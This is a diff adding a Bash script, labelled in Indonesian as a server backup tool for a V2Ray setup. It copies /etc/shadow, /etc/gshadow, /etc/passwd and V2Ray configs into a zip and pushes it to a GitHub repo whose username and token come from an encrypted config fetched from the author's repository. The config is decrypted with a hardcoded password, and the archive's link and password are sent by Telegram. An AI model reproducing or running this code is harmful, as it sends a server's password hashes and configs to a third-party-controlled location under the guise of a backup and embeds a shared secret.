@@ -1,0 +1,122 @@
+#!/bin/bash
+
+# Fungsi warna
+red() { echo -e "\033[31;1m✖ ${*}\033[0m"; }
+green() { echo -e "\033[32;1m✓ ${*}\033[0m"; }
+yellow() { echo -e "\033[33;1m🔸 ${*}\033[0m"; }
+blue() { echo -e "\033[34;1m🔹 ${*}\033[0m"; }
+
+# Garis pembatas
+border() {
+  echo -e "\033[34;1m===============================================\033[0m"
+}
+
+# Header
+header() {
+  clear
+  border
+  echo -e "\033[36;1m                🛡️ BACKUP SYSTEM               \033[0m"
+  border
+}
+
+# Password enkripsi
+ENCRYPTION_PASSWORD="e5a8e726-70ec-11f0-9e2c-33fc5d4c15bc-Rerechan02-e5ab8bfc-70ec-11f0-bb3a-27f55b1c6a00-Rerechan02-e5adf4b4-70ec-11f0-9b85-7f90074a8656"
+
+# Fungsi dekripsi
+decrypt_config() {
+  openssl enc -aes-256-cbc -d -salt -in "$1" -pass pass:"$ENCRYPTION_PASSWORD" -base64 2>/dev/null
+}
+
+# Tampilkan header
+header
+
+# Ambil konfigurasi
+yellow "Mengambil konfigurasi dari server..."
+CONFIG_URL="https://raw.githubusercontent.com/FN-Rerechan02/tools/refs/heads/main/data.json"
+ENCRYPTED_CONFIG=$(curl -sL "$CONFIG_URL")
+
+if [[ -z "$ENCRYPTED_CONFIG" ]]; then
+  red "Gagal mengambil konfigurasi!"
+  exit 1
+fi
+
+# Dekripsi config
+echo "$ENCRYPTED_CONFIG" > /tmp/data.json
+CONFIG_JSON=$(decrypt_config "/tmp/data.json")
+rm -f /tmp/data.json
+
+if ! jq -e . >/dev/null 2>&1 <<<"$CONFIG_JSON"; then
+  red "Konfigurasi tidak valid atau password salah!"
+  exit 1
+fi
+
+# Parse data
+GITHUB_EMAIL=$(jq -r '.email' <<< "$CONFIG_JSON")
+GITHUB_USER=$(jq -r '.username' <<< "$CONFIG_JSON")
+GITHUB_REPO=$(jq -r '.repo' <<< "$CONFIG_JSON")
+GITHUB_TOKEN=$(jq -r '.token' <<< "$CONFIG_JSON")
+GITHUB_BRANCH=$(jq -r '.branch' <<< "$CONFIG_JSON")
+
+# Generate password
+RANDOM_PASSWORD=$(openssl rand -hex 16)
+ZIP_PASSWORD_ENCODED=$(echo "$RANDOM_PASSWORD" | base64)
+
+# Proses backup
+border
+blue "Memulai backup..."
+yellow "➠ Backup file sistem..."
+BACKUP_DIR="/root/backup"
+mkdir -p "$BACKUP_DIR/etc"
+cp /etc/passwd /etc/group /etc/shadow /etc/gshadow "$BACKUP_DIR/etc/"
+cp -r /etc/v2ray "$BACKUP_DIR/etc/"
+
+# Buat ZIP
+ZIP_FILE="/root/backup_$(date +%Y%m%d_%H%M%S).zip"
+yellow "➠ Membuat arsip ZIP terenkripsi..."
+zip -r -P "$RANDOM_PASSWORD" "$ZIP_FILE" "$BACKUP_DIR" >/dev/null
+
+# Upload ke GitHub
+yellow "➠ Mengunggah ke GitHub..."
+GIT_REPO="https://$GITHUB_USER:$GITHUB_TOKEN@github.com/$GITHUB_USER/$GITHUB_REPO.git"
+git clone "$GIT_REPO" /tmp/github-backup 2>/dev/null
+cp "$ZIP_FILE" "/tmp/github-backup/"
+cd "/tmp/github-backup" || exit
+git add . >/dev/null
+git commit -m "Backup $(date +'%d-%m-%Y %H:%M')" >/dev/null
+git push origin "$GITHUB_BRANCH" >/dev/null
+
+# Enkripsi URL
+DOWNLOAD_URL="https://github.com/$GITHUB_USER/$GITHUB_REPO/raw/$GITHUB_BRANCH/$(basename "$ZIP_FILE")"
+ENCRYPTED_URL=$(echo "$DOWNLOAD_URL" | openssl enc -aes-256-cbc -a -salt -pass pass:"$RANDOM_PASSWORD")
+
+# Notifikasi Telegram
+BOT_TOKEN=$(cat /usr/local/etc/v2ray/bot.key)
+CHAT_ID=$(cat /usr/local/etc/v2ray/client.id)
+
+MESSAGE="
+══════════════════════════
+      🛡️ BACKUP BERHASIL      
+══════════════════════════
+🔗 *URL:* \`$ENCRYPTED_URL\`
+🔐 *Password:* \`$ZIP_PASSWORD_ENCODED\`
+══════════════════════════
+🖥️ *Server:* \`$(hostname)\`
+⏰ *Waktu:* \`$(date +"%d-%m-%Y %H:%M")\`
+"
+
+curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
+  -d "chat_id=$CHAT_ID" \
+  --data-urlencode "text=$MESSAGE" \
+  -d "parse_mode=MarkdownV2" >/dev/null
+
+# Bersihkan file
+rm -rf "$BACKUP_DIR" "/tmp/github-backup"
+rm -f "${ZIP_FILE}"
+
+clear
+border
+green "Backup selesai!"
+border
+blue "🔗 URL: $ENCRYPTED_URL"
+blue "🔑 Password: $ZIP_PASSWORD_ENCODED"
+border
